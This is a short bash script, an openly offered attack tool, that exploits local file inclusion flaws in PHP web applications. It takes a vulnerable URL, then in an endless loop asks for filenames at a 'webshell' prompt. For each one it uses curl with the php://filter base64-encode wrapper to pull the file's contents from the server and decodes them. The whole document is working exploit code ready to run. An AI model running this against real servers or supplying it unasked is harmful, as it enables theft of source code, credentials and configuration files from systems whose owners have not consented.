#!/bin/bash

#usage and close if no argument provided
if [ ${#@} == 0 ]; then
        echo "-------------------------------------------"
        echo "|    Usage:./php-filter.sh <vulnerable url>   |"
        echo "|./php-filter.sh http://x.x.x.x/index.php?id= |"
        echo "|      ==Come back later with a URL==     |"
        echo "-------------------------------------------"
        exit 1
fi

#LFI Vulnerable URL argument
URL="$1"

        #Input filenames to Include on an infinite loop
        while true
        do

                read -p "read@webshell:~#" file

                #curl to use phpfilter and grep regex to grab the base64 encoded file then base64 decode
                curl -s $URL\php://filter/read=convert.base64-encode/resource=$file | grep -ioE '[a-zA-Z0-9\+\/\=]{20,}' | base64 -d

done
